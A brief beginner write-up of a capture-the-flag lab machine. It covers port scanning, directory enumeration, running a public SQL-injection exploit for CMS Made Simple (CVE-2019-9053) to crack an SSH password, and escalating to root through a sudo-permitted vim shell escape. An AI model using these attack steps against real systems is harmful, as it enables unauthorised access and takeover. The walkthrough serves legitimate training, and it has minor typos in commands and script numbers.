# Simple CTF

> Beginner level ctf

<br>

Process:
- 1) port scan machine:
  - `nmap -T4 <ip>`
  - number of services found running under port 1000: **2**
- 2) aggressive (service) scan ports:
  - `nmap -T4 -p 21,80,2222 <ip>`
  - service running on the higher port: **ssh**
- 3) enumerate futher:
  - enumerate port 80:
    - find hidden directories:
      - `gobuster dir -u http://10.10.117.232 -w <wordlist>`
      - found: /simple
      - search for files:
        - `gobuster dir -u http://10.10.117.232 -w <wordlist> -x php,txt,back,conf`
        - found:
          - ...
    - `searchploit cms made simple 2.2.8`
      - found: 
        - "CMS Made Simple < 2.2.10 - SQL injection | php/webapps/46625.py"
  - CVE's to use against app: **CVE-2019-9053**
  - what kind of vulernability app is vulnerable to: **CVE-2019-9053**
  - app vulernable to: **SQLi**
- 4) use exploit found:
  - install necessary python modules:
    - `python2 pip -m isnstall <module>`
  - run exploit:
    - `python2 46635.py -u http://10.10.117.232/simple --crack -w <wordlist>`
  - found:
    - username = mitch
    - password = **secret**
- 5) login to ssh:
  - `ssh mitch@10.10.117.232 -p 2222` -> [secret]
- 6) post exploitation:
  - get user flag:
    - `cat user.txt` -> **G00d j0b, keep up!**
  - find other users:
    - `ls /home` -> **sunbath**
  - find a way to spawn a privileged shell:
    - `sudo -l` -> /usr/bin/vim can be run as root 
    - `vim` -> `:!/bin/bash` to get a root shell
  - get root flag:
    - `cat /root/root.txt` -> **W3ll d0n3. You made it!**